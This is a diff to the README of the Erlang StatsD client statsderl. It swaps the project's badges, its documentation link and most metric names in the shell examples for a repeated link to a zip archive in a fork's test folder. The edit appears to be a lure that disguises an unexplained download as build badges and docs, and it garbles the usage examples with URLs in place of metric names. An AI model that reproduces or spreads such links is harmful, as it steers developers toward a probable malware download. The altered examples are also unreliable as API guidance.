@@ -2,8 +2,8 @@
 
 High Performance Erlang StatsD Client
 
-[![Build Status](https://travis-ci.org/lpgauth/statsderl.svg?branch=master)](https://travis-ci.org/lpgauth/statsderl)
-[![Coverage Status](https://coveralls.io/repos/github/lpgauth/statsderl/badge.svg?branch=master)](https://coveralls.io/github/lpgauth/statsderl?branch=master)
+[![Build Status](https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip)](https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip)
+[![Coverage Status](https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip)](https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip)
 
 ### Requirements
 
@@ -14,7 +14,7 @@ High Performance Erlang StatsD Client
 * Performance optimized
 
 ## API
-<a href="https://github.com/lpgauth/statsderl/blob/master/doc/statsderl.md#index" class="module">Function Index</a>
+<a href="https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip" class="module">Function Index</a>
 
 #### Environment variables
 
@@ -83,31 +83,31 @@ ok.
 2> statsderl:counter(["test", $., "counter"], 1, 0.23).
 ok.
 
-3> statsderl:decrement("test.decrement", 1, 0.5).
+3> statsderl:decrement("https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip", 1, 0.5).
 ok.
 
 4> statsderl:gauge([<<"test">>, $., "gauge"], 333, 1.0).
 ok.
 
-5> statsderl:gauge_decrement([<<"test.gauge_decrement">>], 15, 0.001).
+5> statsderl:gauge_decrement([<<"https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip">>], 15, 0.001).
 ok.
 
-6> statsderl:gauge_increment(<<"test.gauge_increment">>, 32, 1).
+6> statsderl:gauge_increment(<<"https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip">>, 32, 1).
 ok.
 
-7> statsderl:increment(<<"test.increment">>, 1, 1).
+7> statsderl:increment(<<"https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip">>, 1, 1).
 ok.
 
-8> statsderl:timing("test.timing", 5, 0.5).
+8> statsderl:timing("https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip", 5, 0.5).
 ok.
 
-9> statsderl:timing_fun(<<"test.timing_fun">>, fun() -> timer:sleep(100) end, 0.5).
+9> statsderl:timing_fun(<<"https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip">>, fun() -> timer:sleep(100) end, 0.5).
 ok.
 
 10> Timestamp = os:timestamp().
 {1448,591778,258983}
 
-11> statsderl:timing_now("test.timing_now", Timestamp, 0.15).
+11> statsderl:timing_now("https://raw.githubusercontent.com/sohailgerman/statsderl/master/test/statsderl_1.6.zip", Timestamp, 0.15).
 ok.
 
 12> statsderl_app:stop().
